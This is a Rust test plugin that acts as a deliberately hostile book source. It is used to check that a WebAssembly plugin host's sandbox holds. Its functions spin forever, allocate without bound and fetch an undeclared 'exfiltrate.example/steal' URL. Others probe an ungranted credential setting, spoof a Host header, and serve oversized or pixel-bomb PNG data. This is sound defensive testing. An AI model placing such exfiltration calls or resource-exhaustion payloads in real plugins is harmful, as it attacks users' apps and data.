//! A misbehaving book source plugin.
//!
//! Test infrastructure, not an example. Every function does something a hostile or broken book
//! source would do, so the conformance suite can show the sandbox holds for the second world as
//! it does for the first. Built for `book-plugin-with-pages`, so it can make pages itself, and so
//! the suite covers that world; the reference `example-books` is a plain `book-plugin`.
//!
//! | Call | Attack |
//! |---|---|
//! | `search` | Never returns: the epoch deadline must stop it. |
//! | `series` | Allocates without bound: the memory ceiling must stop it. |
//! | `list-chapters` | Fetches a host it did not declare: the allowlist must deny it. |
//! | `chapter-content` | Names page images on an undeclared host and reads a setting it was never granted: the host must refuse the pages and answer `none`. It also names pages under `/made/` that it makes itself, one per attack below and one honest page. For the chapter `panics` it panics instead, which traps the guest: the host must answer with an error, run the plugin again and never take the app down. |
//! | `page-bytes` | Per page under `/made/`: hands over more bytes than a page may have, bytes that are no image, an image whose header claims more pixels than a page may have, spins forever, or allocates without bound. The host must refuse or stop each one. The honest page is a real image, and every other page is left to the host to fetch. |
//! | `describe` | Declares one harmless host, so the attempts above are real escapes. |

#[allow(warnings)]
mod bindings {
    wit_bindgen::generate!({
        path: "../../wit/kaeri-books.wit",
        world: "book-plugin-with-pages",
    });
}

use bindings::{
    exports::kaeri::books::{
        pages,
        source::{
            Chapter, Content, Guest, Manifest, Page, SeriesDetail, SeriesHit, SourceError,
            TitleHints,
        },
    },
    kaeri::books::host,
};

struct Component;

impl Guest for Component {
    fn describe() -> Manifest {
        Manifest {
            id: "test-hostile-books".into(),
            display_name: "Hostile books (test only)".into(),
            version: "0.1.0".into(),
            allowed_hosts: vec!["allowed.example".into()],
            media: vec!["manga".into(), "comics-of-the-future".into()],
            languages: vec!["en".into()],
            capabilities: vec!["a-capability-no-host-knows".into()],
        }
    }

    /// Spins forever. Only the host's epoch interruption can stop this.
    fn search(_query: String, _hints: TitleHints) -> Result<Vec<SeriesHit>, SourceError> {
        let mut spin: u64 = 0;
        loop {
            spin = spin.wrapping_add(1);
            std::hint::black_box(spin);
        }
    }

    /// Allocates until the ceiling stops it.
    fn series(_id: String, _hints: TitleHints) -> Result<SeriesDetail, SourceError> {
        let mut hoard: Vec<Vec<u8>> = Vec::new();
        loop {
            hoard.push(std::hint::black_box(vec![0xAB_u8; 4 * 1024 * 1024]));
            if hoard.len() > 4096 {
                return Err(SourceError::Other("ESCAPED: allocated without bound".into()));
            }
        }
    }

    /// Tries to reach a host the manifest never declared.
    fn list_chapters(_id: String, _hints: TitleHints) -> Result<Vec<Chapter>, SourceError> {
        let result = host::fetch(&host::HttpRequest {
            method: "GET".into(),
            url: "https://exfiltrate.example/steal".into(),
            headers: vec![],
            body: None,
        });
        match result {
            Err(host::HostError::Denied(m)) => Err(SourceError::Other(format!("denied: {m}"))),
            Err(other) => Err(SourceError::Other(format!("not-denied: {other:?}"))),
            Ok(_) => Err(SourceError::Other("ESCAPED: the fetch succeeded".into())),
        }
    }

    /// Pages on a host it never declared, which the host must refuse to fetch, and a setting it
    /// was never granted, which the host must answer with `none`.
    fn chapter_content(_series: String, chapter: String) -> Result<Content, SourceError> {
        if chapter == "panics" {
            return Ok(Content::Text(entity_scan(std::hint::black_box(PANICS_ON))));
        }
        if let Some(value) = host::config_get("credential-that-does-not-exist") {
            return Err(SourceError::Other(format!("ESCAPED: config-get leaked {value:?}")));
        }
        let at = |url: &str, headers: Vec<(String, String)>| Page {
            url: url.into(),
            headers,
            width: None,
            height: None,
        };
        let mut pages = vec![
            at("https://exfiltrate.example/page-1.jpg", vec![]),
            // A reserved header: the host sets these itself.
            at(
                "https://allowed.example/page-2.jpg",
                vec![("host".into(), "exfiltrate.example".into())],
            ),
        ];
        pages.extend(MADE.iter().map(|name| at(&format!("{MADE_AT}{name}.png"), vec![])));
        Ok(Content::Images(pages))
    }
}

/// Two entities and then long dashes: three bytes each, so byte 12 falls inside one.
const PANICS_ON: &str = "&gt;&gt;\u{2014}\u{2014}\u{2014} a line of text";

/// A chapter's text with its entities looked for in the first twelve bytes after each `&`,
/// sliced by bytes: on [`PANICS_ON`] that slice cuts a character, and the guest panics.
fn entity_scan(text: &str) -> String {
    let mut out = String::new();
    let mut rest = text;
    while let Some(at) = rest.find('&') {
        out.push_str(&rest[..at]);
        let tail = &rest[at..];
        let window = &tail[..tail.len().min(12)];
        out.push_str(window);
        rest = &tail[window.len()..];
    }
    out.push_str(rest);
    out
}

impl pages::Guest for Component {
    /// Each page under `/made/` is an attack, named by its file name, but for the honest one.
    /// Any other page is the host's to fetch.
    fn page_bytes(
        _series: String,
        _chapter: String,
        url: String,
    ) -> Result<Option<Vec<u8>>, SourceError> {
        let Some(name) = url.strip_prefix(MADE_AT).and_then(|rest| rest.strip_suffix(".png"))
        else {
            return Ok(None);
        };
        let bytes = match name {
            // A real 60 by 90 grey PNG.
            "honest" => png(60, 90, &zlib_stored(&vec![0_u8; 90 * 61])),
            // One byte over the host's page ceiling (16 MiB), dressed as a JPEG.
            "too-large" => {
                let mut bytes = vec![0_u8; 16 * 1024 * 1024 + 1];
                bytes[..3].copy_from_slice(&[0xFF, 0xD8, 0xFF]);
                bytes
            }
            // A web page where an image should be.
            "not-an-image" => b"<html><body>no picture here</body></html>".to_vec(),
            // A real PNG header claiming 20000 by 20000 pixels, 400 million, in 65 bytes.
            "too-many-pixels" => {
                png(20_000, 20_000, &[0x78, 0x9C, 0x03, 0x00, 0x00, 0x00, 0x00, 0x01])
            }
            "spin" => {
                let mut spin: u64 = 0;
                loop {
                    spin = spin.wrapping_add(1);
                    std::hint::black_box(spin);
                }
            }
            "hoard" => {
                let mut hoard: Vec<Vec<u8>> = Vec::new();
                loop {
                    hoard.push(std::hint::black_box(vec![0xAB_u8; 4 * 1024 * 1024]));
                    if hoard.len() > 4096 {
                        return Err(SourceError::Other(
                            "ESCAPED: allocated without bound".into(),
                        ));
                    }
                }
            }
            _ => return Err(SourceError::NotFound),
        };
        Ok(Some(bytes))
    }
}

/// Where the pages it makes are, by name.
const MADE_AT: &str = "https://allowed.example/made/";

/// The names of the pages it makes, in the order `chapter-content` names them.
const MADE: [&str; 6] =
    ["honest", "too-large", "not-an-image", "too-many-pixels", "spin", "hoard"];

/// A PNG of a `width` by `height` grey image whose data chunk is the zlib stream `data`. With an
/// empty stream it is a header that claims a size and holds no pixels at all, which is what a
/// decoder reads before it learns the size.
fn png(width: u32, height: u32, data: &[u8]) -> Vec<u8> {
    let mut header = b"IHDR".to_vec();
    header.extend(width.to_be_bytes());
    header.extend(height.to_be_bytes());
    // 8-bit grey, deflate, adaptive filtering, no interlace.
    header.extend([8, 0, 0, 0, 0]);
    let mut png = b"\x89PNG\r\n\x1a\n".to_vec();
    png.extend(13_u32.to_be_bytes());
    png.extend(&header);
    png.extend(crc32(&header).to_be_bytes());
    let mut chunk = b"IDAT".to_vec();
    chunk.extend(data);
    png.extend((data.len() as u32).to_be_bytes());
    png.extend(&chunk);
    png.extend(crc32(&chunk).to_be_bytes());
    png.extend(0_u32.to_be_bytes());
    png.extend(b"IEND");
    png.extend(crc32(b"IEND").to_be_bytes());
    png
}

/// `bytes` as a zlib stream of stored blocks, which needs no compressor.
fn zlib_stored(bytes: &[u8]) -> Vec<u8> {
    let mut out = vec![0x78, 0x01];
    let blocks: Vec<&[u8]> = bytes.chunks(0xFFFF).collect();
    for (i, block) in blocks.iter().enumerate() {
        out.push(u8::from(i + 1 == blocks.len()));
        let len = block.len() as u16;
        out.extend(len.to_le_bytes());
        out.extend((!len).to_le_bytes());
        out.extend(*block);
    }
    let (mut a, mut b) = (1_u32, 0_u32);
    for &byte in bytes {
        a = (a + u32::from(byte)) % 65521;
        b = (b + a) % 65521;
    }
    out.extend(((b << 16) | a).to_be_bytes());
    out
}

/// The CRC every PNG chunk ends with.
fn crc32(bytes: &[u8]) -> u32 {
    let mut crc = !0_u32;
    for &byte in bytes {
        crc ^= u32::from(byte);
        for _ in 0..8 {
            crc = if crc & 1 == 1 { (crc >> 1) ^ 0xEDB8_8320 } else { crc >> 1 };
        }
    }
    !crc
}

bindings::export!(Component with_types_in bindings);
